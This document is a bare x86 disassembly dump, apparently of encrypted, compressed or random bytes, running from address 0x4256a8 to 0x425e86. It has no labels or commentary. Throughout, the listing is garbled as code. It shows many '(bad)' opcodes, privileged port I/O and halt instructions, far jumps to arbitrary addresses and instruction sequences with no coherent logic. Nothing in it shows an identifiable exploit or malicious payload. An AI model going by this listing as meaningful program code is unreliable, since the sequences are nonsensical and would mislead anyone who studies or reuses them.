  4256a8:	mov    ds:0x30939546,eax
  4256ad:	cs cmp eax,esp
  4256b0:	bound  ebx,QWORD PTR [eax-0x21c18649]
  4256b6:	mov    bl,0x2
  4256b8:	out    0x70,al
  4256ba:	push   edi
  4256bb:	and    al,0xe2
  4256bd:	es enter 0x7167,0x77
  4256c2:	emms   
  4256c4:	or     edi,ecx
  4256c6:	mul    BYTE PTR [ebx]
  4256c8:	xor    eax,0x68488e5b
  4256cd:	jmp    0x42567e
  4256cf:	pop    edx
  4256d0:	mov    cl,0xf4
  4256d2:	jo     0x425698
  4256d4:	mov    bh,dl
  4256d6:	inc    ecx
  4256d7:	pop    eax
  4256d8:	mov    edx,0x791f7438
  4256dd:	pop    ss
  4256de:	ret    0xb24e
  4256e1:	push   0x18387be7
  4256e6:	mov    ebp,0x72968d97
  4256eb:	cmp    ebx,DWORD PTR [esi+0x5c9ced67]
  4256f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256f2:	dec    edx
  4256f3:	xor    DWORD PTR [ebp+0x73],esi
  4256f6:	xor    BYTE PTR [ebp+0x17],dl
  4256f9:	push   ebp
  4256fa:	(bad)  
  4256fb:	sbb    DWORD PTR [edi],esi
  4256fd:	mov    edi,0xf7365170
  425702:	push   esp
  425703:	(bad)  
  425704:	xor    BYTE PTR [ebx+0x405729ba],dh
  42570a:	shr    DWORD PTR [edx-0x4a],0x50
  42570e:	into   
  42570f:	retf   0x35a2
  425712:	imul   esp,DWORD PTR [ebp-0x5d],0xd26f9693
  425719:	jo     0x42571d
  42571b:	popa   
  42571c:	jne    0x425763
  42571e:	fwait
  42571f:	xchg   edx,eax
  425721:	shl    DWORD PTR [eax+0x69],cl
  425724:	inc    esi
  425725:	add    al,0x79
  425727:	pop    edi
  425728:	in     eax,0xb8
  42572a:	clc    
  42572b:	or     DWORD PTR [esi+0x6cc5bbe2],0x3b
  425732:	jl     0x425720
  425734:	mov    esi,0x402a2980
  425739:	std    
  42573a:	mov    ds:0x7f0f6851,eax
  42573f:	rol    bh,0x50
  425742:	cmovae edi,DWORD PTR [ebp+0x5395631]
  425749:	outs   dx,BYTE PTR ds:[esi]
  42574a:	mov    ecx,0xb95cb45c
  42574f:	and    al,0x24
  425751:	pop    es
  425752:	add    ch,BYTE PTR [ebx-0x7b5f9b21]
  425758:	test   DWORD PTR ds:0x43a36feb,0x5fcb707e
  425762:	loop   0x42571c
  425764:	push   edx
  425765:	xor    DWORD PTR [ebx],esi
  425767:	ins    BYTE PTR es:[edi],dx
  425768:	aam    0xd9
  42576a:	bnd call 0xc107d2d9
  425770:	mov    ch,0xed
  425772:	cmp    bl,dh
  425774:	push   esp
  425775:	xlat   BYTE PTR ds:[ebx]
  425776:	icebp  
  425777:	ins    DWORD PTR es:[edi],dx
  425778:	je     0x425748
  42577a:	cli    
  42577b:	cmp    edx,ebp
  42577d:	call   0x45ce:0x391fa7d9
  425784:	jge    0x4257c7
  425786:	fdivr  QWORD PTR ds:0x237f2cb8
  42578c:	bound  edi,QWORD PTR [ebp+0x62a385e5]
  425792:	mov    bl,0x2c
  425794:	xor    BYTE PTR [ebp+0x1c],bh
  425797:	mov    ebp,0xf4a59659
  42579c:	mov    eax,ds:0xa854dac6
  4257a1:	(bad)  
  4257a2:	cdq    
  4257a3:	jne    0x425796
  4257a5:	jo     0x425799
  4257a7:	or     BYTE PTR ds:0xb502dd71,ah
  4257ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257ae:	push   ebx
  4257af:	imul   ecx,DWORD PTR [edx+ebx*1+0x78],0xab76e69e
  4257b7:	push   cs
  4257b8:	mov    esi,0x2ba27d8c
  4257bd:	icebp  
  4257be:	ficomp WORD PTR [eax+0x45]
  4257c1:	dec    eax
  4257c2:	in     eax,0x27
  4257c4:	arpl   sp,bx
  4257c6:	add    bl,bl
  4257c8:	arpl   WORD PTR [eax+0x58],sp
  4257cb:	sub    al,0x35
  4257cd:	mov    edi,0xa80050eb
  4257d2:	fmul   QWORD PTR [edx-0x33]
  4257d5:	lods   al,BYTE PTR ds:[esi]
  4257d6:	(bad)  
  4257d7:	or     al,0xe4
  4257d9:	or     BYTE PTR [eax+esi*2-0x723754fe],bl
  4257e0:	enter  0xdf9f,0xb0
  4257e4:	and    eax,0xc7099154
  4257e9:	pop    ds
  4257ea:	inc    esi
  4257eb:	mov    ?,WORD PTR [ebp-0xc3fc2bf]
  4257f1:	push   ss
  4257f2:	dec    ebx
  4257f3:	outs   dx,DWORD PTR ds:[esi]
  4257f4:	sbb    edi,DWORD PTR [esi]
  4257f6:	test   al,0x98
  4257f8:	pop    edi
  4257f9:	retf   0x92af
  4257fc:	int3   
  4257fd:	mov    eax,0x90d196cc
  425802:	xchg   BYTE PTR [eax],dh
  425804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425805:	pop    esi
  425806:	pushf  
  425807:	fsubr  st(2),st
  425809:	push   edi
  42580a:	les    ebx,FWORD PTR [ebx+eiz*8-0x47]
  42580e:	js     0x4257f7
  425810:	or     DWORD PTR [edx+0x6f],esp
  425813:	in     al,dx
  425814:	or     bl,cl
  425816:	xlat   BYTE PTR ds:[ebx]
  425817:	cmp    BYTE PTR [edi+0x29],0xc5
  42581b:	test   BYTE PTR [esi+0x5],dh
  42581e:	call   0x3e5c:0x92938515
  425825:	inc    eax
  425826:	ret    0xb271
  425829:	cmp    al,0xa9
  42582b:	fisttp DWORD PTR [edi+0x427512e0]
  425831:	aad    0xe3
  425833:	pop    ebp
  425834:	(bad)  
  425835:	or     BYTE PTR [esi+0x3b],ch
  425838:	pop    edx
  425839:	je     0x42580b
  42583b:	sub    al,0x87
  42583d:	rep outs dx,BYTE PTR ds:[esi]
  42583f:	mov    ebp,0x787abf96
  425844:	addr16 dec ebx
  425846:	stc    
  425847:	(bad)  
  425848:	mov    ebx,0x6d9d7be8
  42584d:	xchg   ebp,eax
  42584e:	lock stc 
  425850:	mov    esi,ecx
  425852:	outs   dx,BYTE PTR ds:[esi]
  425853:	pop    edi
  425854:	or     al,BYTE PTR [eax+0x4de2f03f]
  42585a:	repnz ins BYTE PTR es:[edi],dx
  42585c:	sbb    eax,DWORD PTR [eax]
  42585e:	add    BYTE PTR [eax],al
  425860:	add    BYTE PTR [eax],al
  425862:	add    eax,0xaf44af85
  425867:	outs   dx,BYTE PTR ds:[esi]
  425868:	out    dx,eax
  425869:	lds    ecx,FWORD PTR [ecx+0x745d36f8]
  42586f:	or     BYTE PTR [ebp+0x1d0e235],bl
  425875:	add    bl,dh
  425877:	add    al,0x0
  425879:	add    BYTE PTR [edi+0x3e9ea5c1],ch
  42587f:	sar    DWORD PTR [eax],1
  425881:	sbb    cl,BYTE PTR [edx+0x125ed71b]
  425887:	sbb    dl,cl
  425889:	or     dl,ah
  42588b:	mov    ebp,0xbd293c40
  425890:	loop   0x4258c5
  425892:	iret   
  425893:	in     eax,0x1e
  425895:	ret    
  425896:	mov    al,0xe5
  425898:	jno    0x4258f1
  42589a:	test   eax,0xdba5969a
  42589f:	push   ebp
  4258a0:	or     edx,edx
  4258a2:	repnz push eax
  4258a4:	push   ss
  4258a5:	or     cl,BYTE PTR [esi+0x2cb9b9c5]
  4258ab:	test   eax,ebx
  4258ad:	rcl    DWORD PTR [ebx+0x194ce2bb],1
  4258b3:	cdq    
  4258b4:	(bad)  
  4258b5:	push   ds
  4258b6:	inc    esi
  4258b7:	or     BYTE PTR [edx],dh
  4258b9:	or     BYTE PTR [esi],ah
  4258bb:	std    
  4258bc:	inc    ebp
  4258bd:	frstor [edi]
  4258bf:	(bad)  
  4258c0:	jnp    0x42587a
  4258c2:	sub    dh,bh
  4258c4:	cmc    
  4258c5:	dec    ecx
  4258c6:	xchg   ecx,eax
  4258c7:	push   esp
  4258c8:	xor    ebx,DWORD PTR [esi]
  4258ca:	mov    esp,0xf984099e
  4258cf:	mov    ?,esp
  4258d1:	aas    
  4258d2:	push   ebx
  4258d3:	sbb    ecx,DWORD PTR [edx+0x70]
  4258d6:	outs   dx,BYTE PTR ds:[esi]
  4258d7:	int    0xf6
  4258d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258da:	mov    ds:0x84060b97,al
  4258df:	pushf  
  4258e0:	fmul   QWORD PTR [edx+0x57ea9d67]
  4258e6:	mov    ebx,0x33837ea2
  4258eb:	xor    DWORD PTR [bx],edi
  4258ee:	mov    ds:0x5385d12a,al
  4258f3:	cwde   
  4258f4:	test   eax,0x9c19ce22
  4258f9:	call   0xfb47ca81
  4258fe:	call   0x12ffbe8
  425903:	ret    
  425904:	popa   
  425905:	fcmovb st,st(3)
  425907:	mov    edx,0x1c12f1f0
  42590c:	cmc    
  42590d:	push   esp
  42590e:	jp     0x4258e1
  425910:	pop    edi
  425911:	and    edi,DWORD PTR [esi]
  425913:	daa    
  425914:	sub    ebp,DWORD PTR [ebp-0x22]
  425917:	les    ecx,FWORD PTR [esi-0xc62b9ca]
  42591d:	imul   edi,DWORD PTR [eax-0x13],0x10037300
  425924:	mov    cl,0xb4
  425926:	mov    WORD PTR [edx],?
  425928:	sar    ebp,0x8d
  42592b:	das    
  42592c:	mov    ah,0x46
  42592e:	sbb    eax,0x51ac9a6b
  425933:	sub    BYTE PTR [ebx+0x52],dh
  425936:	xchg   esi,eax
  425937:	push   ss
  425938:	and    eax,edi
  42593a:	popf   
  42593b:	scas   al,BYTE PTR es:[edi]
  42593c:	sub    eax,0xed9b2a8b
  425941:	jp     0x4258ca
  425943:	adc    edx,DWORD PTR [edx-0x34]
  425946:	mov    BYTE PTR ds:0xba46d779,ch
  42594c:	in     eax,dx
  42594d:	stc    
  42594e:	pop    ebp
  42594f:	int3   
  425950:	jo     0x4259ac
  425952:	into   
  425953:	xor    eax,0x23d4de77
  425958:	les    esi,FWORD PTR [esp+edx*1+0x1152483e]
  42595f:	mov    cl,0xcb
  425961:	(bad)  
  425962:	mov    edx,0x2b697250
  425967:	int3   
  425968:	push   edx
  425969:	stos   DWORD PTR es:[edi],eax
  42596a:	xor    al,0xbb
  42596c:	or     dh,cl
  42596e:	sbb    DWORD PTR [eax+0x59],edx
  425971:	jae    0x42593a
  425973:	dec    eax
  425974:	xor    BYTE PTR [ebp-0x69],0x40
  425978:	scas   al,BYTE PTR es:[edi]
  425979:	(bad)  
  42597a:	out    dx,al
  42597b:	pop    esi
  42597d:	mov    al,0x8b
  42597f:	sub    al,0xef
  425981:	dec    edx
  425982:	aam    0x17
  425984:	jle    0x42599d
  425986:	or     ebp,0x85099154
  42598c:	or     esi,DWORD PTR ds:0xa9a32e38
  425992:	loop   0x425971
  425994:	cmp    edi,ebx
  425996:	sbb    al,0xc5
  425998:	or     al,0x7f
  42599a:	jo     0x42595c
  42599c:	nop
  42599d:	gs ja  0x42599e
  4259a0:	addr16 sub eax,esp
  4259a3:	and    ebp,DWORD PTR [edi+0xb]
  4259a6:	pop    ss
  4259a7:	and    ecx,DWORD PTR [ebp-0x3ed31480]
  4259ad:	and    eax,0xdfac2a20
  4259b2:	fnsave [edx]
  4259b4:	in     al,0x84
  4259b6:	lods   al,BYTE PTR ds:[esi]
  4259b7:	retf   0x69de
  4259ba:	add    DWORD PTR [ebp+0x36],ebp
  4259bd:	add    DWORD PTR ds:0x417d8eff,0x2f65fd09
  4259c7:	fiadd  WORD PTR [ebx-0x6d006f24]
  4259cd:	xor    esp,DWORD PTR ds:0x20d22719
  4259d3:	nop
  4259d4:	ror    BYTE PTR [ecx+0xd],0x88
  4259d8:	or     edx,esp
  4259da:	cmp    ebp,eax
  4259dc:	mov    ss,WORD PTR [esi-0x1ffa620]
  4259e2:	xchg   ecx,eax
  4259e3:	pop    edx
  4259e4:	jne    0x425a5e
  4259e6:	add    DWORD PTR [ebp-0x29],edi
  4259e9:	jmp    0x99c9:0x50cc893c
  4259f0:	pop    eax
  4259f1:	enter  0x42b6,0xe9
  4259f5:	test   DWORD PTR [eax+0x69],edx
  4259f8:	cs cld 
  4259fa:	sbb    ebx,ecx
  4259fc:	lds    ecx,FWORD PTR [edx]
  4259fe:	retf   
  4259ff:	ror    edx,cl
  425a01:	lock push edi
  425a03:	ret    0x86f7
  425a06:	leave  
  425a07:	fisub  DWORD PTR [ebp+0x4edeb11c]
  425a0d:	sub    al,0x6
  425a0f:	sub    eax,DWORD PTR [ecx+0xf600e65]
  425a15:	cmp    eax,DWORD PTR [eax+ecx*8]
  425a18:	sub    esi,edi
  425a1a:	lds    esp,FWORD PTR [eax+eiz*8]
  425a1d:	sbb    eax,0xe888da60
  425a22:	jo     0x425a5b
  425a24:	add    eax,DWORD PTR [ecx+0x3a]
  425a27:	imul   edi,DWORD PTR [edx-0x6e8b945],0x6df14d85
  425a31:	pop    ds
  425a32:	pushf  
  425a33:	xor    al,0xc6
  425a35:	fidivr WORD PTR [ecx]
  425a37:	jno    0x425a56
  425a39:	sbb    DWORD PTR [ecx],ecx
  425a3b:	lods   eax,DWORD PTR ds:[esi]
  425a3c:	xlat   BYTE PTR ds:[ebx]
  425a3d:	arpl   WORD PTR fs:[ecx-0x1ff979],bp
  425a44:	stos   DWORD PTR es:[edi],eax
  425a45:	mov    DWORD PTR [esi+0x172890a0],esp
  425a4b:	enter  0x96,0xce
  425a4f:	cmp    al,0x99
  425a51:	xor    esi,edi
  425a53:	jmp    0xd00da240
  425a58:	push   ss
  425a59:	imul   edi,DWORD PTR [eax+0x3d],0xffffffe5
  425a5d:	cs retf 0x86f2
  425a61:	push   edx
  425a62:	(bad)  
  425a63:	ins    DWORD PTR es:[edi],dx
  425a64:	fwait
  425a65:	shl    BYTE PTR [edi],0x28
  425a68:	(bad)  
  425a69:	push   ds
  425a6a:	jnp    0x425a6e
  425a6c:	xchg   edx,eax
  425a6d:	retf   
  425a6e:	adc    al,0xb1
  425a70:	inc    edi
  425a71:	test   al,0x50
  425a73:	add    al,0xe1
  425a75:	ror    BYTE PTR cs:[ebp-0x6c],0x9
  425a7a:	mov    ecx,0xbda1e34d
  425a7f:	or     eax,0x1ebda4e6
  425a84:	out    dx,al
  425a85:	cmc    
  425a86:	adc    ebx,DWORD PTR [esi-0x2ae47856]
  425a8c:	add    dl,cl
  425a8e:	retf   0xa936
  425a91:	popa   
  425a92:	stos   BYTE PTR es:[edi],al
  425a93:	xchg   ebx,eax
  425a94:	cmc    
  425a95:	mov    al,ds:0x865548f1
  425a9a:	push   ebp
  425a9b:	call   0xe2867b4d
  425aa0:	or     bl,BYTE PTR [ecx]
  425aa2:	and    edi,DWORD PTR [esi+ebp*1+0x65724752]
  425aa9:	push   ds
  425aaa:	cmc    
  425aab:	dec    ebp
  425aac:	xchg   ebp,eax
  425aad:	adc    DWORD PTR [ebp+0x18e1f132],eax
  425ab3:	push   0x3e
  425ab5:	aad    0xc6
  425ab7:	in     al,0x72
  425ab9:	pop    esp
  425aba:	xchg   esi,eax
  425abb:	arpl   WORD PTR [esi],di
  425abd:	int3   
  425abe:	cli    
  425abf:	xor    al,0x32
  425ac1:	sub    eax,0xa48f557a
  425ac6:	in     al,0x76
  425ac8:	jne    0x425b33
  425aca:	sar    DWORD PTR [ebx-0x21],1
  425acd:	xchg   edi,eax
  425ace:	cmc    
  425acf:	dec    eax
  425ad0:	jmp    0xfb91:0xc27f7509
  425ad7:	arpl   WORD PTR [esi-0x7b],bx
  425ada:	(bad)  
  425adb:	int3   
  425adc:	pop    es
  425add:	mov    al,ds:0x31b6dd9a
  425ae2:	repz mov edi,0x2dbf244d
  425ae8:	lods   eax,DWORD PTR ds:[esi]
  425ae9:	jbe    0x425b66
  425aeb:	xor    al,0x69
  425aed:	push   0x59
  425aef:	sahf   
  425af0:	adc    DWORD PTR [eiz*2+0x34e32726],ecx
  425af7:	je     0x425b64
  425af9:	cmc    
  425afa:	pop    ds
  425afb:	aad    0xcc
  425afd:	mov    edi,0xb72b0735
  425b02:	lea    esp,[ebp+0xa]
  425b05:	inc    edi
  425b06:	ins    WORD PTR es:[edi],dx
  425b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b09:	mov    cl,0x4c
  425b0b:	js     0x425b89
  425b0d:	xor    eax,0xca43b8ac
  425b12:	mov    ds:0x50a0bbab,eax
  425b17:	ss jae 0x425ac0
  425b1a:	adc    BYTE PTR [ebp+eax*4-0x19],al
  425b1e:	das    
  425b1f:	aam    0x1f
  425b21:	or     ch,BYTE PTR [edx+0x69]
  425b24:	push   ecx
  425b25:	in     eax,dx
  425b26:	jno    0x425b88
  425b28:	test   BYTE PTR [ebp-0x1e],cl
  425b2b:	imul   eax,esi,0x64
  425b2e:	jb     0x425ba5
  425b30:	pop    edi
  425b31:	xchg   ebp,eax
  425b32:	jle    0x425b4f
  425b34:	adc    eax,0xfc930cd6
  425b39:	enter  0xe216,0x9a
  425b3d:	in     al,dx
  425b3e:	jno    0x425ac4
  425b40:	dec    ch
  425b42:	adc    BYTE PTR [esi+0x5d],ah
  425b45:	nop
  425b46:	ins    DWORD PTR es:[edi],dx
  425b47:	adc    bl,dl
  425b49:	cmc    
  425b4a:	dec    esp
  425b4b:	sub    edi,DWORD PTR [eax+0x3]
  425b4e:	or     eax,0xffab209a
  425b53:	mul    BYTE PTR [ebp-0x69d245c0]
  425b59:	mov    esp,0x232b574b
  425b5e:	sub    ecx,ecx
  425b60:	ins    BYTE PTR es:[edi],dx
  425b61:	mov    WORD PTR [esi+ebp*4],fs
  425b64:	mov    ecx,0xda21bc59
  425b69:	pop    esp
  425b6a:	cld    
  425b6b:	out    dx,al
  425b6c:	(bad)  [ebx-0x22a5e63f]
  425b72:	call   0x8b0f:0x65d1087b
  425b79:	sub    al,bl
  425b7b:	mov    eax,0x8584d661
  425b80:	test   DWORD PTR [ebx-0x24],esi
  425b83:	xchg   edi,eax
  425b84:	hlt    
  425b85:	aad    0x49
  425b87:	mov    WORD PTR [eax+0x643848bb],gs
  425b8d:	repz adc al,0x16
  425b90:	add    al,0x7e
  425b92:	call   0xf7791520
  425b97:	repnz mov ds:0xec1fa1ef,eax
  425b9d:	fld    TBYTE PTR [ebp-0x3df4cf58]
  425ba3:	mov    bl,0x17
  425ba5:	out    0xc9,al
  425ba7:	mov    ah,0xa
  425ba9:	push   esi
  425baa:	mov    ebx,ebp
  425bac:	sahf   
  425bad:	clc    
  425bae:	push   edi
  425baf:	push   esp
  425bb0:	push   ebx
  425bb1:	or     al,0x26
  425bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bb4:	xchg   esp,eax
  425bb5:	or     BYTE PTR [ebx-0x6d5ea79d],dl
  425bbb:	mov    bl,BYTE PTR [ecx-0xc]
  425bbe:	psubsw mm7,QWORD PTR [edi]
  425bc1:	fadd   QWORD PTR [edx-0x11aabc7f]
  425bc7:	fsub   QWORD PTR [esi]
  425bc9:	push   0xffffff94
  425bcb:	int3   
  425bcc:	inc    ecx
  425bcd:	leave  
  425bce:	jmp    0x92ce455d
  425bd3:	inc    eax
  425bd4:	dec    ebp
  425bd5:	sti    
  425bd6:	mov    dl,0x34
  425bd8:	push   ebp
  425bd9:	fstp   st(2)
  425bdb:	(bad)  
  425bdc:	jmp    0x425b97
  425bde:	mov    ebx,0xeb95b81a
  425be3:	push   ebp
  425be4:	imul   BYTE PTR [edi+eax*2+0x26955cea]
  425beb:	dec    ecx
  425bec:	(bad)
  425bf1:	ins    BYTE PTR es:[edi],dx
  425bf2:	pusha  
  425bf3:	imul   ecx,DWORD PTR [edx-0x7],0x1
  425bf7:	jle    0x425b7d
  425bf9:	xlat   BYTE PTR ds:[ebx]
  425bfa:	add    eax,0xd3ab991a
  425bff:	jg     0x425c64
  425c01:	push   0xe3de0f55
  425c06:	sti    
  425c07:	mov    BYTE PTR [edi+0x2e],ch
  425c0a:	gs je  0x425be6
  425c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c0e:	fmul   QWORD PTR [eax]
  425c10:	sbb    al,0x73
  425c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c13:	inc    eax
  425c14:	sti    
  425c15:	cmp    cl,BYTE PTR [eax+0x1d]
  425c18:	ret    
  425c19:	pushf  
  425c1a:	add    ah,BYTE PTR [edx+0x108fe57d]
  425c20:	add    ah,dl
  425c22:	adc    al,dh
  425c24:	in     al,dx
  425c25:	cmp    eax,0x5695ad8e
  425c2a:	or     BYTE PTR [edx+0x4b],dl
  425c2d:	mov    eax,ds:0xfa2dbdcf
  425c32:	mov    bl,bl
  425c34:	sbb    al,0xda
  425c36:	add    ch,BYTE PTR [ecx]
  425c38:	jb     0x425c45
  425c3a:	jb     0x425bc4
  425c3c:	ds inc esi
  425c3e:	call   0xc30b500f
  425c43:	shr    cl,cl
  425c45:	(bad)  
  425c46:	cs in  al,dx
  425c48:	mov    dh,0xb4
  425c4a:	(bad)  
  425c4c:	inc    ecx
  425c4d:	adc    BYTE PTR [edi-0x21],ah
  425c50:	fcmovnb st,st(7)
  425c52:	dec    esp
  425c53:	je     0x425c68
  425c55:	fsubr  st(5),st
  425c57:	fwait
  425c58:	inc    edi
  425c59:	dec    esp
  425c5a:	xchg   esi,eax
  425c5b:	sub    ecx,DWORD PTR [ecx]
  425c5d:	or     DWORD PTR [ebp+0x37],eax
  425c60:	fild   WORD PTR [esi]
  425c62:	mov    BYTE PTR [ebp+0x7f85dd88],dl
  425c68:	mov    ebx,0xd8d4ccf8
  425c6d:	push   esp
  425c6e:	xchg   ecx,eax
  425c6f:	sahf   
  425c70:	pusha  
  425c71:	push   ebp
  425c72:	js     0x425bf5
  425c74:	xchg   ecx,eax
  425c75:	je     0x425c56
  425c77:	in     al,dx
  425c78:	dec    ecx
  425c79:	sub    DWORD PTR es:[eax+0x72fc50d7],ebp
  425c80:	dec    edi
  425c81:	and    eax,0x5fbd9349
  425c86:	pop    edi
  425c87:	call   DWORD PTR [ebx+0x42]
  425c8a:	cld    
  425c8b:	mov    dl,0x9b
  425c8d:	jae    0x425c16
  425c8f:	aaa    
  425c90:	and    BYTE PTR [eax],cl
  425c92:	int3   
  425c93:	and    ah,ch
  425c95:	ror    DWORD PTR [ecx-0x57],1
  425c98:	cmp    dh,BYTE PTR [ecx]
  425c9a:	outs   dx,DWORD PTR ds:[esi]
  425c9b:	push   ds
  425c9c:	vmptrst QWORD PTR [ecx+eax*4-0x247da855]
  425ca4:	push   ecx
  425ca5:	aam    0xe
  425ca7:	int    0x75
  425ca9:	mov    esi,0x6b861633
  425cae:	or     esp,esi
  425cb0:	and    ch,BYTE PTR [edx]
  425cb2:	out    0xf4,eax
  425cb4:	scas   eax,DWORD PTR es:[edi]
  425cb5:	sbb    eax,0x348c6493
  425cba:	pop    eax
  425cbb:	ins    BYTE PTR es:[edi],dx
  425cbc:	mov    ebp,DWORD PTR [eax+eax*1]
  425cbf:	pop    esp
  425cc0:	mov    edi,0xe8931c6d
  425cc5:	push   eax
  425cc6:	in     al,0x54
  425cc8:	lea    esp,[edx-0xfb9f67f]
  425cce:	or     ch,dl
  425cd0:	scas   eax,DWORD PTR es:[edi]
  425cd1:	sbb    eax,DWORD PTR [edi+0x6e2b1305]
  425cd7:	pop    edi
  425cd8:	fisub  WORD PTR [esi]
  425cda:	pop    ebx
  425cdb:	mov    esi,0x5556bd10
  425ce0:	popf   
  425ce1:	std    
  425ce2:	and    eax,0x34567620
  425ce7:	popa   
  425ce8:	push   edi
  425ce9:	xchg   edx,eax
  425cea:	dec    ebx
  425ceb:	cdq    
  425cec:	sar    BYTE PTR [edi-0x4a851f3a],cl
  425cf2:	pop    eax
  425cf3:	ins    BYTE PTR es:[edi],dx
  425cf4:	lds    ebp,FWORD PTR ds:0x6a1f27e7
  425cfa:	mov    dh,0x85
  425cfc:	add    ah,dl
  425cfe:	cmp    ebx,DWORD PTR [ebx]
  425d00:	test   dl,dl
  425d02:	sub    esi,DWORD PTR [eax]
  425d04:	nop
  425d05:	test   eax,0x8990126
  425d0a:	fistp  QWORD PTR [esi-0x69]
  425d0d:	es jno 0x425d27
  425d10:	adc    dh,bl
  425d12:	cwde   
  425d13:	aas    
  425d14:	dec    DWORD PTR [edx-0x7e]
  425d17:	test   DWORD PTR [edx+0x377e43c6],esi
  425d1d:	shl    al,1
  425d1f:	adc    al,0x54
  425d21:	pop    ebp
  425d22:	add    ecx,DWORD PTR [ebp+0x66]
  425d25:	add    BYTE PTR [edi-0x20958c57],0x37
  425d2c:	cmp    BYTE PTR [edx+0x47],dh
  425d2f:	(bad)  [ebx+0x47db2028]
  425d35:	inc    ecx
  425d36:	(bad)
  425d3a:	ret    0x978c
  425d3d:	sbb    bh,al
  425d3f:	dec    ecx
  425d40:	clc    
  425d41:	xchg   edi,eax
  425d42:	hlt    
  425d43:	mov    al,ds:0xe917e20b
  425d48:	bound  ebp,QWORD PTR [edx-0x76]
  425d4b:	push   esp
  425d4c:	or     cl,BYTE PTR [ebx-0x52]
  425d4f:	rol    cl,1
  425d51:	mov    edi,es
  425d53:	cs hlt 
  425d55:	sub    eax,ebx
  425d57:	shl    ch,cl
  425d59:	cmc    
  425d5a:	pop    ebx
  425d5b:	enter  0x54ea,0x83
  425d5f:	or     edi,DWORD PTR [ebp-0x6796bb86]
  425d65:	pop    ebx
  425d66:	in     eax,dx
  425d67:	iret   
  425d68:	mov    esi,0xb9b6d040
  425d6d:	add    BYTE PTR [eax],al
  425d6f:	add    BYTE PTR [eax],al
  425d71:	add    dh,ch
  425d73:	retf   0xd589
  425d76:	lods   eax,DWORD PTR ds:[esi]
  425d77:	xlat   BYTE PTR ds:[ebx]
  425d78:	(bad)  
  425d79:	sti    
  425d7a:	(bad)  
  425d7c:	mov    ss,WORD PTR [ecx+ebp*8+0x69]
  425d80:	lods   eax,DWORD PTR ds:[esi]
  425d81:	adc    ch,0xd5
  425d84:	add    DWORD PTR [eax],eax
  425d86:	repz add al,0x0
  425d89:	add    BYTE PTR [esi],al
  425d8b:	mov    ecx,0x19a76532
  425d90:	mov    bl,bh
  425d92:	xor    DWORD PTR [eax-0x6ebb4585],edi
  425d98:	pop    esi
  425d99:	fsubr  QWORD PTR [edi]
  425d9b:	nop
  425d9c:	stos   DWORD PTR es:[edi],eax
  425d9d:	adc    BYTE PTR [eax-0x7f],dh
  425da0:	psllq  mm4,QWORD PTR [ebx]
  425da3:	push   ecx
  425da4:	in     al,dx
  425da5:	sar    dh,1
  425da7:	add    eax,0x43717e9a
  425dac:	xor    edi,DWORD PTR ds:0x2183ed53
  425db2:	cli    
  425db3:	ss in  al,0xa6
  425db6:	data16 add al,0x1a
  425db9:	mov    cl,0xa6
  425dbb:	mov    ebp,DWORD PTR [edx]
  425dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dbe:	hlt    
  425dbf:	jmp    0x5ebd1eb2
  425dc4:	cmp    eax,0x976526e9
  425dc9:	push   0xa35ab9bf
  425dce:	rol    BYTE PTR [edx],1
  425dd0:	xchg   ebx,eax
  425dd1:	lods   eax,DWORD PTR ds:[esi]
  425dd2:	mov    edx,0x92071511
  425dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dd8:	stc    
  425dd9:	sub    eax,0x3c10b6ad
  425dde:	out    dx,eax
  425ddf:	xchg   edx,eax
  425de0:	jne    0x425e38
  425de2:	seto   BYTE PTR [ebp+0x70]
  425de6:	test   BYTE PTR [ebx],dh
  425de8:	mov    DWORD PTR [ebp-0x23a358a8],eax
  425dee:	daa    
  425def:	outs   dx,DWORD PTR ds:[esi]
  425df0:	es mov al,0x59
  425df3:	fwait
  425df4:	xchg   BYTE PTR [edi+0x3b],ah
  425df7:	sahf   
  425df8:	xor    esi,DWORD PTR [esi-0xc0c026d]
  425dfe:	inc    edi
  425dff:	pushf  
  425e00:	imul   esp,DWORD PTR [edi],0xffffffd3
  425e03:	or     ebx,edx
  425e05:	leave  
  425e06:	add    edi,eax
  425e08:	leave  
  425e09:	mov    ch,0xa1
  425e0b:	popf   
  425e0c:	xlat   BYTE PTR ds:[ebx]
  425e0d:	mov    DWORD PTR [ebx],edx
  425e0f:	sub    al,0xa0
  425e11:	jl     0x425e0d
  425e13:	test   al,0xb0
  425e15:	xchg   esp,eax
  425e16:	pusha  
  425e17:	cli    
  425e18:	je     0x425d9a
  425e1a:	(bad)  cs:[eax]
  425e1d:	adc    eax,0x9d74acad
  425e22:	arpl   WORD PTR [esi+0x34],bx
  425e25:	mov    eax,ebp
  425e27:	pop    ds
  425e28:	push   ebx
  425e29:	add    DWORD PTR ds:0xcedf9d5a,esp
  425e2f:	mov    DWORD PTR [ecx],eax
  425e31:	dec    edx
  425e32:	xor    ecx,DWORD PTR [edi+0x6b394c30]
  425e38:	jecxz  0x425e78
  425e3a:	(bad)  
  425e3b:	dec    ecx
  425e3c:	sub    edx,DWORD PTR ds:0xe747f9fb
  425e42:	mov    al,0xf1
  425e44:	adc    al,0xeb
  425e46:	sti    
  425e47:	test   dl,dl
  425e49:	jge    0x425e91
  425e4b:	sbb    eax,0x8d40f49e
  425e50:	rcr    BYTE PTR [ecx],1
  425e52:	jl     0x425e22
  425e54:	pop    ebx
  425e55:	lea    eax,[edx-0x1583b849]
  425e5b:	ret    0x876d
  425e5e:	sub    DWORD PTR [eax-0x26609a80],esp
  425e64:	or     al,0xf2
  425e66:	dec    ecx
  425e67:	call   FWORD PTR [ebx-0x592a3555]
  425e6d:	test   al,0xe0
  425e6f:	cmc    
  425e70:	or     al,0x34
  425e72:	mov    ebp,0x40db8dc5
  425e77:	mov    bh,0x60
  425e79:	in     al,0xc1
  425e7b:	(bad)  
  425e7c:	or     ebp,DWORD PTR [edi-0x435a3b1f]
  425e82:	xor    al,0xbf
  425e84:	jnp    0x425ec6
  425e86:	inc    esi
